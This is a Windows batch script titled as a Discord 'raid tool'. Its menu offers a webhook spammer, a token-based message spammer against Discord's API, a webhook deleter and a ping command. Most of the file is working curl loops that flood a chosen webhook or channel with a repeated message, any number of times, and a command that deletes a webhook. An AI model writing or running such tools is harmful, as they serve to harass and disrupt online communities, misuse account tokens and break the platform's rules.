@echo off
chcp 65001
color d
title J3ns's Discord Raid Tool

:menu
cls
echo 			███╗   ███╗██╗   ██╗ █████╗ ██╗  ██╗ ██████╗  ██████╗ ██╗  ██╗ 
echo 			████╗ ████║██║   ██║██╔══██╗██║  ██║██╔═══██╗██╔═══██╗██║ ██╔╝
echo 			██╔████╔██║██║   ██║███████║███████║██║   ██║██║   ██║█████╔╝ 
echo 			██║╚██╔╝██║██║   ██║██╔══██║██╔══██║██║   ██║██║   ██║██╔═██╗ 
echo 			██║ ╚═╝ ██║╚██████╔╝██║  ██║██║  ██║╚██████╔╝╚██████╔╝██║  ██╗
echo 			╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝
echo 			██╗   ██╗██████╗                                              
echo 			██║   ██║╚════██╗                                             
echo 			██║   ██║ █████╔╝                                             
echo 			╚██╗ ██╔╝██╔═══╝                                              
echo  	 		 ╚████╔╝ ███████╗
echo.
echo [1] Webhook Spammer
echo [3] Webhook Deleter
echo [4] Message Spammer
echo [5] IP Pinger
echo [0] Exit
set /p choice=Choose Option: 
if %choice%==1 goto webhook
if %choice%==3 goto deleter
if %choice%==4 goto msgspammer
if %choice%==5 goto pinger
if %choice%==0 exit

:webhook
cls
echo Webhook URL: 
set /p url=
echo Message: 
set /p msg=
echo Amount: 
set /p amount=
for /l %%i in (1, 1, %amount%) do (curl -X POST -H "Content-Type: application/json" -d "{\"content\":\"%msg%\"}" %url%)
pause
goto menu

:token
cls
echo Token: 
set /p token=
echo Message: 
set /p msg=
echo Amount: 
set /p amount=
for /l %%i in (1, 1, %amount%) do (curl -X POST -H "Authorization: %token%" -H "Content-Type: application/json" -d "{\"content\":\"%msg%\"}" https://discord.com/api/v9/channels/CHANNEL_ID/messages)
pause
goto menu

:deleter
cls
echo Webhook URL: 
set /p url=
curl -X DELETE %url%
pause
goto menu

:msgspammer
cls
echo Webhook or Token? (W/T)
set /p type=
if /i %type%==W goto webhook
if /i %type%==T goto token
goto menu

:pinger
cls
echo IP Address: 
set /p ip=
ping %ip%
pause
goto menu